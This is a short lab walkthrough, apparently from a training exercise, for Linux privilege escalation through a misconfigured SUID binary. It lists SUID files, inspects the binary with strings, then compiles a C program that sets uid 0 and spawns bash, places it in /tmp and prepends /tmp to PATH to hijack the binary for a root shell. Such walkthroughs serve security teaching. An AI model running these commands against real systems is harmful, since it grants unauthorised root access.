**Detection**

[[Linux]] Target
- In command prompt type: 
```
find / -type f -perm -04000 -ls 2>/dev/null
```

- From the output, make note of all the SUID binaries.

- In command prompt type: 
```
strings /usr/local/bin/suid-env
```

- From the output, notice the functions used by the binary.

**Exploitation**
Target machine:

-  In command prompt type:

```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```

-  In command prompt type: 
```
gcc /tmp/service.c -o /tmp/service
```

- In command prompt type: 
```
export PATH=/tmp:$PATH
```

- In command prompt type: 
```
/usr/local/bin/suid-env
```

- In command prompt type: 
```
id
```
